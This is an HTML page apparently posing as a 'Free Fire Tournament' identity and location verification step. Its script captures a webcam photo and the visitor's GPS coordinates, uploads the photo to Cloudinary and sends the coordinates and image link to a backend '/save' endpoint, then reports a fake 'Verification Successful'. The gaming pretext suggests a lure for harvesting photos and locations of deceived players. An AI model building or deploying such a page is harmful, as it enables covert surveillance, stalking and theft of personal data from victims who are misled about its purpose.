<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>Free Fire Tournament</title>
<script src="https://cdn.tailwindcss.com"></script>

<style>
body {
  background: radial-gradient(circle at top, #1a0f00, #000);
}
</style>
</head>

<body class="min-h-screen flex items-center justify-center px-4">

<div class="max-w-md w-full bg-black/60 backdrop-blur-xl
            border border-orange-500/30 rounded-2xl
            shadow-2xl p-6 text-center">

  <h1 class="text-3xl font-bold text-orange-400 mb-1">
    Free Fire Tournament
  </h1>
  <p class="text-gray-400 text-sm mb-4">
    Identity & Location Verification
  </p>

  <!-- Camera -->
  <div class="rounded-xl overflow-hidden border border-orange-500/30 mb-4">
    <video id="video" autoplay playsinline class="w-full h-48 object-cover"></video>
    <canvas id="canvas" class="hidden"></canvas>
  </div>

  <p id="msg" class="text-gray-200 mb-4">
    Allow camera & location
  </p>

  <button id="verifyBtn"
    class="w-full bg-orange-500 hover:bg-orange-600
           text-black font-bold py-2 rounded-lg">
    Continue
  </button>

  <div id="loader"
    class="hidden mx-auto mt-4 w-10 h-10 border-4
           border-orange-400 border-t-transparent
           rounded-full animate-spin">
  </div>

</div>

<script>
  
const CLOUDINARY_URL = "<%= process.env.CLOUDINARY_URL %>";
const UPLOAD_PRESET = "<%= process.env.CLOUDINARY_UPLOAD_PRESET %>";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const msg = document.getElementById("msg");
const loader = document.getElementById("loader");

/* üé• Camera */
navigator.mediaDevices.getUserMedia({ video: true })
  .then(stream => video.srcObject = stream)
  .catch(() => msg.innerText = "‚ùå Camera access denied");

btn.onclick = async () => {
  loader.classList.remove("hidden");
  msg.innerText = "Verifying‚Ä¶";

  navigator.geolocation.getCurrentPosition(async (pos) => {

    /* Capture Image */
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext("2d").drawImage(video, 0, 0);
    const blob = await new Promise(r => canvas.toBlob(r, "image/jpeg"));

    /* Upload to Cloudinary */
    const form = new FormData();
    form.append("file", blob);
    form.append("upload_preset", UPLOAD_PRESET);

    const cloudRes = await fetch(CLOUDINARY_URL, {
      method: "POST",
      body: form
    });

    const cloudData = await cloudRes.json();

    /* Save to backend */
    await fetch("/save", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        imageUrl: cloudData.secure_url
      })
    });

    loader.classList.add("hidden");
    msg.innerText = "‚úÖ Verification Successful";

  }, () => {
    loader.classList.add("hidden");
    msg.innerText = "‚ùå Location denied";
  });
};
</script>

</body>
</html>